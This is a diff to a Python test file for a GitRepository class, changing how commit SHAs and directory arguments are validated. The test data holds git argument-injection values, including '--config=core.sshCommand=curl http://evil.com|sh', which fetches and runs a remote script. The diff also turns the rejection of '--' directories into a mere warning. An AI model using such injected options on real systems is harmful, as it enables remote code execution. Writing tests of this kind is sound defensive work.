@@ -206,12 +206,12 @@ class TestGitRepository:
             "-c core.sshCommand=evil",
             "not-a-hex-string",
             "ghijkl",
-            "12345",  # too short
+            "abc",  # too short (< 4 chars)
             "a" * 65,  # too long (exceeds SHA-256 length)
         ],
     )
     def test_init_rejects_invalid_commit_sha(self, invalid_sha: str):
-        with pytest.raises(ValueError, match="Invalid commit SHA"):
+        with pytest.raises(ValueError, match="use the 'branch' parameter instead"):
             GitRepository(
                 url="https://github.com/org/repo.git",
                 commit_sha=invalid_sha,
@@ -220,6 +220,7 @@ class TestGitRepository:
     @pytest.mark.parametrize(
         "valid_sha",
         [
+            "abcd",  # 4-char short SHA
             "1234567",
             "1234567890",
             "abcdef1234567890abcdef1234567890abcdef12",  # SHA-1 (40 chars)
@@ -236,18 +237,21 @@ class TestGitRepository:
         assert repo._commit_sha == valid_sha
 
     @pytest.mark.parametrize(
-        "invalid_dir",
+        "suspicious_dir",
         [
             "--config=core.sshCommand=curl http://evil.com|sh",
             "--upload-pack=evil",
         ],
     )
-    def test_init_rejects_directories_starting_with_double_dash(self, invalid_dir: str):
-        with pytest.raises(ValueError, match="Invalid directory"):
-            GitRepository(
+    def test_init_warns_on_directories_starting_with_double_dash(
+        self, suspicious_dir: str
+    ):
+        with pytest.warns(UserWarning, match="starts with '--'"):
+            repo = GitRepository(
                 url="https://github.com/org/repo.git",
-                directories=[invalid_dir],
+                directories=[suspicious_dir],
             )
+        assert repo._directories == [suspicious_dir]
 
     def test_init_accepts_valid_directories(self):
         repo = GitRepository(
